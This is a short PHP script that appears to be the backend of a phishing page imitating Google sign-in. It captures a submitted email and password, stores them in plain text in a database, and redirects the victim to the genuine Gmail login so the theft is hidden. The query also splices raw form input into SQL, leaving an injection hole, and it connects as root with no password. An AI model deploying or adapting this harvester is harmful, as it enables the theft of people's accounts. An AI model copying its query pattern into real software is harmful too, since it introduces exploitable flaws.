<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "nome_do_banco";

try {
  $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
  // set the PDO error mode to exception
  $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
  $sql = "INSERT INTO usuarios (email, password, data)
  VALUES ('" . $_POST["email"] . "', '" . $_POST["password"] . "', '" . date('Y-m-d H:i:s') . "')";
  // use exec() because no results are returned
  $conn->exec($sql);
  header ("location: https://accounts.google.com/signin/v2/identifier?service=mail&passive=true&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=ServiceLogins");
} catch(PDOException $e) {
  header ("location: ../../");
}

$conn = null;
?>
